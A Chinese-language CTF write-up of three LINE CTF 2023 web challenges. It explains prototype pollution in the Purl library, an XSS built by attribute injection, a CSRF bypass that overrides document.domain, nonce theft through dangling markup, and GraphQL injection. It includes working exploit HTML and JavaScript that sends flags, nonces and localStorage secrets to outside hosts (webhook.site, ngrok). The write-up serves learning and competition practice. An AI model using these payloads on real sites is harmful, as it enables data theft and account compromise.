---
title: LINE CTF 2023 筆記
catalog: true
date: 2023-03-27 09:10:44
tags: [Security]
categories: [Security]
photos: /img/linectf-2023-writeup/cover.png
---

今年 Water Paddler 拿了第二名，總共 9 題 web 解掉了 8 題（我貢獻了 2 題），整體 web 的難度我覺得去年似乎比較難，今年比的人似乎也比較少一點。

話說最近我發現自己的 writeup 筆記沒有以前這麼多了，其中一個原因是最近比較忙，另一個原因是最近有興趣的題目（client side）沒這麼多，或我也有在想搞不好是隊友越變越強，還沒開題就被隊友解掉，我也懶得再去看題目，於是就懶得寫筆記了XD

這次只記幾題有參與或有興趣的，其他就先省略了。

<!-- more -->

## Flag Masker (9 solves)

這題後端的程式碼很簡單，就是可以建立一個 note，然後輸出是安全的，沒有 XSS 的風險。

有趣的地方是 admin bot 接了一個 extension，程式碼有混淆過但幸好很短，worker.js 如下：

``` js
(() => {
  "use strict";
  (() => {
    console.log("Flag Master - worker script is loaded.");
    var e = function(e, n) {
      return n.replace(e, (function(e, r, a) {
        n = n.replace(new RegExp(r, "g"), "*".repeat(r.length)), n += "\x3c!--DETECTED FLAGS ARE MASKED BY EXTENSION--\x3e"
      })), n
    };
    chrome.runtime.onMessage.addListener((function(n, r, a) {
      var t = n.regex ? new RegExp(n.regex, "g") : new RegExp("LINECTF\\{(.+)\\}", "g");
      ! function(e, n) {
        var r = n.head,
          a = n.body;
        return e.test(r + a)
      }(t, n) ? a({
        head: null,
        body: null,
        flag: !1
      }): a({
        head: e(t, n.head),
        body: e(t, n.body),
        flag: !0
      })
    }))
  })()
})();
```

接收到 message 之後根據傳來的 regexp 去替換畫面上的內容，然後再傳回去。

而 content.js 是這樣：

``` js
(() => {
  var t = {
      576: (t, r, e) => {
        var a, n;
        void 0 === (n = "function" == typeof(a = function() {
          var t = {
              a: "href",
              img: "src",
              form: "action",
              base: "href",
              script: "src",
              iframe: "src",
              link: "href",
              embed: "src",
              object: "data"
            },
            r = ["source", "protocol", "authority", "userInfo", "user", "password", "host", "port", "relative", "path", "directory", "file", "query", "fragment"],
            e = {
              anchor: "fragment"
            },
            a = {
              strict: /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
              loose: /^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/
            },
            n = /^[0-9]+$/;

          function o(t, e) {
            for (var n = decodeURI(t), o = a[e ? "strict" : "loose"].exec(n), i = {
                attr: {},
                param: {},
                seg: {}
              }, s = 14; s--;) i.attr[r[s]] = o[s] || "";
            return i.param.query = f(i.attr.query), i.param.fragment = f(i.attr.fragment), i.seg.path = i.attr.path.replace(/^\/+|\/+$/g, "").split("/"), i.seg.fragment = i.attr.fragment.replace(/^\/+|\/+$/g, "").split("/"), i.attr.base = i.attr.host ? (i.attr.protocol ? i.attr.protocol + "://" + i.attr.host : i.attr.host) + (i.attr.port ? ":" + i.attr.port : "") : "", i
          }

          function i(t, r) {
            if (0 === t[r].length) return t[r] = {};
            var e = {};
            for (var a in t[r]) e[a] = t[r][a];
            return t[r] = e, e
          }

          function s(t, r, e, a) {
            var o = t.shift();
            if (o) {
              var u = r[e] = r[e] || [];
              "]" == o ? c(u) ? "" !== a && u.push(a) : "object" == typeof u ? u[function(t) {
                var r = [];
                for (var e in t) t.hasOwnProperty(e) && r.push(e);
                return r
              }(u).length] = a : u = r[e] = [r[e], a] : ~o.indexOf("]") ? (o = o.substr(0, o.length - 1), !n.test(o) && c(u) && (u = i(r, e)), s(t, u, o, a)) : (!n.test(o) && c(u) && (u = i(r, e)), s(t, u, o, a))
            } else c(r[e]) ? r[e].push(a) : "object" == typeof r[e] || void 0 === r[e] ? r[e] = a : r[e] = [r[e], a]
          }

          function u(t, r, e) {
            if (~r.indexOf("]")) s(r.split("["), t, "base", e);
            else {
              if (!n.test(r) && c(t.base)) {
                var a = {};
                for (var o in t.base) a[o] = t.base[o];
                t.base = a
              }
              "" !== r && function(t, r, e) {
                var a = t[r];
                void 0 === a ? t[r] = e : c(a) ? a.push(e) : t[r] = [a, e]
              }(t.base, r, e)
            }
            return t
          }

          function f(t) {
            return function(t, r) {
              for (var e = 0, a = t.length >> 0, n = arguments[2]; e < a;) e in t && (n = r.call(void 0, n, t[e], e, t)), ++e;
              return n
            }(String(t).split(/&|;/), (function(t, r) {
              try {
                r = decodeURIComponent(r.replace(/\+/g, " "))
              } catch (t) {}
              var e = r.indexOf("="),
                a = function(t) {
                  for (var r, e, a = t.length, n = 0; n < a; ++n)
                    if ("]" == (e = t[n]) && (r = !1), "[" == e && (r = !0), "=" == e && !r) return n
                }(r),
                n = r.substr(0, a || e),
                o = r.substr(a || e, r.length);
              return o = o.substr(o.indexOf("=") + 1, o.length), "" === n && (n = r, o = ""), u(t, n, o)
            }), {
              base: {}
            }).base
          }

          function c(t) {
            return "[object Array]" === Object.prototype.toString.call(t)
          }

          function d(t, r) {
            return 1 === arguments.length && !0 === t && (r = !0, t = void 0), r = r || !1, {
              data: o(t = t || window.location.toString(), r),
              attr: function(t) {
                return void 0 !== (t = e[t] || t) ? this.data.attr[t] : this.data.attr
              },
              param: function(t) {
                return void 0 !== t ? this.data.param.query[t] : this.data.param.query
              },
              fparam: function(t) {
                return void 0 !== t ? this.data.param.fragment[t] : this.data.param.fragment
              },
              segment: function(t) {
                return void 0 === t ? this.data.seg.path : (t = t < 0 ? this.data.seg.path.length + t : t - 1, this.data.seg.path[t])
              },
              fsegment: function(t) {
                return void 0 === t ? this.data.seg.fragment : (t = t < 0 ? this.data.seg.fragment.length + t : t - 1, this.data.seg.fragment[t])
              }
            }
          }
          return d.jQuery = function(r) {
            null != r && (r.fn.url = function(e) {
              var a, n, o = "";
              return this.length && (o = r(this).attr((a = this[0], void 0 !== (n = a.tagName) ? t[n.toLowerCase()] : n)) || ""), d(o, e)
            }, r.url = d)
          }, d.jQuery(window.jQuery), d
        }) ? a.call(r, e, r, t) : a) || (t.exports = n)
      },
      144: function(t, r, e) {
        "use strict";
        var a = this && this.__importDefault || function(t) {
          return t && t.__esModule ? t : {
            default: t
          }
        };
        Object.defineProperty(r, "__esModule", {
          value: !0
        });
        var n, o, i = a(e(576));
        console.log("Flag Masker - content script is loaded."), n = (0, i.default)(location.href), o = {}, localStorage.config ? o = JSON.parse(localStorage.config) : fetch("/config").then((function(t) {
          return t.json()
        })).then((function(t) {
          localStorage.setItem("config", JSON.stringify(t)), o = t
        })), chrome.runtime.sendMessage({
          regex: o.regex,
          head: window.document.head.innerHTML,
          body: window.document.body.innerHTML
        }).then((function(t) {
          t.flag && (window.document.head.innerHTML = t.head, window.document.body.innerHTML = t.body, fetch(n.data.attr.path + "/alert", {
            referrerPolicy: "unsafe-url"
          }))
        }))
      }
    },
    r = {};
  ! function e(a) {
    var n = r[a];
    if (void 0 !== n) return n.exports;
    var o = r[a] = {
      exports: {}
    };
    return t[a].call(o.exports, o, o.exports, e), o.exports
  }(144)
})();
```

這個程式碼就比較長一點了，不過在做的事情大概就是先讀取 config，然後把 body 跟 head 的內容都傳給剛剛的 worker 去做取代，取代完之後再放回畫面上，然後有找到符合的內容，回報給 `n.data.attr.path + /alert` 這個位置。

上面那一大串如果搜尋一下，會發現是來自於 [Purl](https://github.com/allmarkedup/purl) 這個停止維護很久的 library，除了有 prototype pollution 的問題以外，對於網址的 parse 也是漏洞百出。

首先是 prototype pollution，我們只要污染 config 就可以控制 `localStorage.config` 屬性，傳入我們想要的 regexp，原本想的是可以弄個 ReDos 之類的再看怎麼樣去偵測時間，但後來發現 `n.data.attr.path` 這個也是可以控制的。

舉例來說，`http://web:8000/#@acabc//8cae-ip.ngrok.io` 這個網址的 path 會被解析成 `//8cae-ip.ngrok.io`，所以可以把 request 傳到我們這裡來。

再搭配前面講的 config，就可以知道哪個 regexp 有配對到。

``` html
<script>
  const domain = '8cae.ngrok.io'
  const base = 'http://' + domain
  function getUrl(flag) {
    return `http://web:8000/#@acabc//${domain}/${flag}?q[__proto__][config]={"regex":"${flag}"}`
  }

  function report(msg) {
    fetch(base + '?msg=' + msg)
  }

  function visit(str) {
    var w = window.open(getUrl(str))
    setTimeout(() => {
      w.close()
    }, 2000)
  }

  let flag = 'LINECTF{'
  const charset = '0123456789abcdef'
  const sleep = ms => new Promise(r => setTimeout(r, ms))
  async function main() {

    for(let i=0; i<32; i++) {
      for(let c of charset) {
        const str = flag + ".".repeat(i) + c
        visit(str)
        await sleep(100)
      }
    }
  }

  main()
  

</script>
```

除了這種解法以外，另一種更猛的是直接利用原本的功能做出 XSS，每一個 note 的結構是這樣：

``` html
<li>
  <div class="rotate-1 yellow-bg">
    <p>{content}</p>
  </div>
</li>
```

假設我建立了兩個 note，第一個內容是 `" id=a x="`，第二個是 `LINECTF{rotate-1 yellow-bg"}`

HTML 內容就會變成：

``` html
<li>
  <div class="rotate-1 yellow-bg">
    <p>" id=a x="</p>
  </div>
</li>
<li>
  <div class="rotate-1 yellow-bg">
    <p>LINECTF{rotate-1 yellow-bg"}</p>
  </div>
</li>
```

其實 `"` 在後端一樣會被編碼，所以直接看 source 的話會看到 `&#34;`，但如果是用 `document.body.innerHTML`，或許是瀏覽器覺得沒必要 encode，就會看到雙引號，而不是 `&#34;`，所以雙引號的編碼反倒沒作用了。

接著 extension 介入，把 `rotate-1 yellow-bg"` 變成 *** 之類的字，就變成：

``` html
<li>
  <div class="xxx>
    <p>" id=a x="</p>
  </div>
</li>
<li>
  <div class="xxx>
    <p>LINECTF{xxx}</p>
  </div>
</li>
```

稍微調整一下新的結構：

``` html
<li>
  <div class="xxx><p>" id=a x="</p></div></li><li><div class=" xxx>
    <p>LINECTF{xxx}</p>
  </div>
</li>
```

前面的一個雙引號被取代掉，跟原本內容開頭的雙引號結合，最後面的 `x="` 則跟下一個結合，而中間的 id=a 順利變成了屬性的一部分。

換句話說，我們可以對 div 插入任意屬性，就能利用 focus 的功能做出 XSS，底下是在 Discord 中 Renwa 給的 payload：

```
note 1:
"tabindex="1"onfocus="eval(window.name)"style="position:relative;height: 20000px; width: 20008px;"autofocus="1"id="jj"x="

note 2:
LINECTF{rotate-1 yellow-bg"}

Report:
@domain.wtf/0ff.html

Contents of 0ff.html:
<!DOCTYPE html>
<html>
<body>
<img src=http://httpstat.us/200?sleep=5000>
<script>
var x= window.open('http://web:3000/8be526fd-e193-436c-a431-84141a0903b9','fetch(`http://web:8000/`,{credentials: "same-origin"}).then(x=>x.text()).then(x=>fetch(`https://webhook.site/603ab026-5a65-432f-a894-5d981fd24198?flag=${btoa(x)}`))');
setTimeout(function(){
x.location='http://web:8000/8be526fd-e193-436c-a431-84141a0903b9#jj'
},500)

</script>


</html>
```

當時完全沒想到可以這樣，真是厲害。

## Another Secure Store Note (7 solves)

這題有個改名字的功能，名字會直接反映在畫面上，是一個 free XSS，但問題是改名字會需要檢查 CSRF token，有一個叫做 `getSettings.js` 的檔案裡面會有 CSRF token：

``` js
function isInWindowContext() {
  const tmp = self;
  self = 1; // magic
  const res = (this !== self);
  self = tmp;
  return res;
}

// Ensure it is in window context with correct domain only :)
// Setting up variables and UI
if (isInWindowContext() && document.domain === '<%= domain %>') {
  const urlParams = new URLSearchParams(location.search);
  try { document.getElementById('error').innerText = urlParams.get('error'); } catch (e) {}
  try { document.getElementById('message').innerText = urlParams.get('message'); } catch (e) {}
  try { document.getElementById('_csrf').value = '<%= csrf %>'; } catch (e) {}
}
```

這邊會檢查是不是在 window context 以及 `document.domain`，看到這邊我瞬間想起了 2022 年 10 月的 Intigriti XSS challenge，作者 writeup 在這：https://github.com/0xGodson/blogs/blob/master/_posts/2022-10-14-intigriti-oct-xss-challenge-author-writeup.md

裡面有一個部分是用 web worker 來繞過對 `window.location.href` 以及 `document.domain` 的檢查，像是這樣：

``` js
// worker.js

window = {}
window.location = {}
document = {}

// send the secret to top window!
window.saveSecret = function(msg){  
  self.postMessage(msg)  
}

window.location.href = "https://challenge-1022.intigriti.io/challenge/create";
document.domain = "challenge-1022.intigriti.io";

// we can use importScripts function from API to import external scripts!
importScripts("https://challenge-1022.intigriti.io/challenge/getSecret.js");
```

所以這題特別檢查 context 應該是想把這個擋住，但幸好當時在研究 Intigriti 這個的時候，我發現 `document.domain` 其實可以自己用 `Object.defineProperty` 硬蓋過去，所以這樣就可以 CSRF：

``` html
<script>
  Object.defineProperty(document, 'domain', {
    value: '35.200.57.143'
  })
</script>
<input id="_csrf" />
<script src="https://35.200.57.143:11004/getSettings.js"></script>
<form id=f method=POST action="https://35.200.57.143:11004/profile" target="_blank">
  <input name="name" value="poc">
  <input name="csrf" value="">
</form>

<script>
  const csrf = _csrf.value
  f.csrf.value = csrf
  f.submit()
</script>
```

再來就是要偷 nonce 了，這題用的瀏覽器是 Firefox，對於 [Dangling Markup Injection](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection) 似乎沒做什麼防護，可以用 meta redirect 偷到下面的內容：`<meta http-equiv=refresh content='0; url=http://43d1-ip.ngrok.io/steal?q=`

最後一步就是要阻止 `csp.gif` 的載入，因為只要這個被載入的話，nonce 就會改變，我花了一個半小時找尋怎麼把它擋掉，原本想說應該可以靠之前提過的 concurrent limit 來防止，但怎麼弄都不成功。

最後發現原本 `base-uri` 是 `self`，所以 base 是可以用的，那就用 base 就好了，浪費了一小時 QQ

``` html
<script>
  Object.defineProperty(document, 'domain', {
    value: '35.200.57.143'
  })
</script>
<input id="_csrf" />
<script src="https://35.200.57.143:11004/getSettings.js"></script>
<form id=f method=POST action="https://35.200.57.143:11004/profile" target="test">
  <input name="name" value="poc">
  <input name="csrf" value="">
</form>

<script>
  var win = window.open('https://35.200.57.143:11004/profile', 'test')
  fetch('/clear')
  stealNoncePayload = "<base href='https://35.200.57.143:11004/abc/def/'><meta http-equiv=refresh content='0; url=http://43d1-ip.ngrok.io/steal?q="
  const csrf = _csrf.value
  f.csrf.value = csrf
  f.name.value = stealNoncePayload
  
  setTimeout(() => {
    f.submit()
  }, 500)
  

  function poll() {
    fetch('/nonce')
      .then(res => res.text())
      .then(nonce => {
          if (!nonce) {
            return setTimeout(poll, 100)
          }
          f.name.value = `<script nonce=${nonce}>
            location = 'http://43d1-ip.ngrok.io?q='+localStorage.getItem('secret')
          <\/script>`
          f.submit()
      })
  }
  poll()

</script>
```

## Momomomomemomemo (3 solves)

這題隊友解出來的，也滿有趣的，總之就是前端會根據你提供的 id 用 GraphQL 去抓結果：

``` js
memo(id) {
    const query = `query { 
        memo (
            id: "${id}", 
            token: "${this.token}") {
                content
            } 
        }`;
    return this.#query(query);
}
```

在最後 query 的部分是使用了 [persisted queries](https://www.apollographql.com/docs/apollo-server/performance/apq/)，以前有聽過，大概就是你先送 query 的 hash 出去，如果以前就有執行過的話，會直接送結果回來。

反之若是沒有，你就再送一次 hash + query，讓後端去 cache 結果，而前端的實作是這樣：

``` js
async #query(query) {
    const hash = await this.#getQueryHash(query);
    const res = await fetch(
        this.endpoint +
            "?" +
            new URLSearchParams({
                extensions: JSON.stringify({
                    persistedQuery: { version: 1, sha256Hash: hash },
                }),
            }),
        {
            headers: { "Content-type": "application/json" },
        }
    );
    const data = await res.clone().json();
    if (data.errors) {
        if (data.errors[0].extensions.code == "PERSISTED_QUERY_NOT_FOUND") {
            return await fetch(this.endpoint, {
                method: "POST",
                headers: { "Content-type": "application/json" },
                body: JSON.stringify({
                    query,
                    extensions: {
                        persistedQuery: {
                            version: 1,
                            sha256Hash: hash,
                        },
                    },
                }),
            });
        }
    }
    return res;
}
```

這邊前端也用了 Purl 這個 lib，所以一樣有 prototype pollution 可以用，但這題可以污染什麼呢？答案在底下這一段裡面：

``` js
const purl = window.purl

const memoId = purl().param('id')

const gql = new GraphQL(location.origin)

class GraphQL {
    constructor(host, option = {}) {
        this.endpoint = host + "/";
        this.endpoint += option.path || "graphql";
    }
    // ...
}
```

你可以污染 path，就能操控 `option.path`，但操控這個可以做什麼？這就跟後端的 i18n 邏輯有關了，實作如下：

``` js
// simple i18n
app.use(function (req, res, next) {
    let origPath = req.originalUrl.split('?')[0]
    let origParam = req.originalUrl.split('?')[1]
    let langPath = 'en/'
    
  
    if (origPath.match(/((\/en\/?)|(\/ja\/?))$/) || origPath.match(/^(\/static\/|\/graphql\/?|\/favicon.ico\/?)/)) {
      next()
    } else {
      if (req.headers['accept-language'] && req.headers['accept-language'].split(',')[0] === 'ja') langPath = 'ja/'
      res.redirect(origPath + (origPath.endsWith('/') ? '' : '/') + langPath + (origParam ? '?' + origParam : ''))
    }
  })
```

要注意的是 `req.originalUrl` 只會有 path 的部分，所以像 http://chall:11005/abc 的話，originalUrl 就會是 `/abc`。

靠著上面操控的 path，我們可以把 path 污染成 `/huli.tw/`，這樣送出的 URL 就是：`http://34.85.126.119:11005//huli.tw/?extensions=...`，到了後端的 redirect 邏輯，最後就會被導到 `//huli.tw/en/?extension=...`。

如此一來，就可以靠著 prototype pollution 把 request 導到自己的 server，拿到 query string。

這題的目的是要偷 admin 的 memo，可是我們並不知道 admin memo id，要怎麼辦呢？

仔細看這一段：

``` js
memo(id) {
    const query = `query { 
        memo (
            id: "${id}", 
            token: "${this.token}") {
                content
            } 
        }`;
    return this.#query(query);
}
```

我們可以精心構造一個 id 達成 GraphQL injection，像這樣：

``` js
query { 
  memo (
    id: "a", token: "b"
  ) { content }

  memo2: memos(
    token: "${this.token}") {
        content
    } 
}
```

這樣就變成了兩個 query，原本應該是 memo 的 token 變成了 memos 的 token，就可以拿到所有 admin 的 note。

因此，最後的解法就是先送一次這個改造過的 query，讓 server 把結果存起來，再加上 prototype pollution，讓 request 導到我們的 server，就可以知道 hash 是多少，就能拿到結果。

